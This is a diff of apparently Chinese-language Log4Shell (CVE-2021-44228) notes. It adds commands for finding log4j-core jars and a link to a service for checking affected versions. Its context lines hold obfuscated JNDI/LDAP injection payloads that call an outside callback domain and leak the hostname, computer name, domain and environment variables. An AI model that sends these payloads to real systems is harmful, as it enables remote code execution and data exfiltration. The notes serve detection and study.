@@ -18,6 +18,11 @@ ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.nsvi5s
 ${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}
 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}
 ```
+### 查找
+```
+find . -name *.jar|grep log4j-core
+mvn dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core
+```
 
 
 ### Ref
@@ -27,3 +32,4 @@ ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.${env:
 - https://github.com/jas502n/Log4j2-CVE-2021-44228
 - http://slf4j.org/log4shell.html
 - https://github.com/cldrn/codeql-queries/blob/master/log4j-injection.ql
+- [Apache Log4j2 漏洞影响面查询](https://log4j2.huoxian.cn/layout)
